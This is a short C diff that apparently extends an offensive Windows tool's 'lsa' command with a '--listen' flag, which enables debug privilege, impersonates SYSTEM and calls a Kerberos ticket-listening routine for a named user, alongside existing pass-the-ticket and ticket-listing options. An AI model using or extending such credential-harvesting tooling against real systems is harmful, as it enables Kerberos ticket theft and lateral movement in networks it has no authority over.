@@ -129,6 +129,7 @@ int cmd_lsa(int argc, char *argv[]) {
   struct arg_str *outfile;
   struct arg_str *infile;
   struct arg_lit *listKerb;
+  struct arg_lit *listen;
   void *argtable[] = {
       help = arg_lit0(NULL, "help", "show help"),
       spn = arg_str0(NULL, "spn", "<value>", "spn/target service"),
@@ -139,6 +140,7 @@ int cmd_lsa(int argc, char *argv[]) {
       infile =
           arg_str0(NULL, "input", "<value>", "input file for pass the ticket."),
       listKerb = arg_lit0(NULL, "listKerb", "list tickets"),
+      listen = arg_lit0(NULL, "listen", "listen for tickets on a target user."),
       end = arg_end(20),
   };
   int narg = sizeof(argtable) / sizeof(argtable[0]);
@@ -168,6 +170,19 @@ int cmd_lsa(int argc, char *argv[]) {
     EnablePrivilege("debug");
     ImpersonateSystem();
     ListTickets();
+    return 0;
+  }
+  if (listen->count > 0) {
+    if (user->count < 1) {
+      printf("username is required!\n");
+      return 1;
+    }
+    EnablePrivilege("debug");
+    ImpersonateSystem();
+    ULONG userLen = strlen(user->sval[0]);
+    WCHAR wUser[256];
+    MultiByteToWideChar(CP_ACP, 0, user->sval[0], -1, wUser, 256);
+    KerberosListen(wUser);
     return 0;
   }
   PCredHandle credH = NULL;
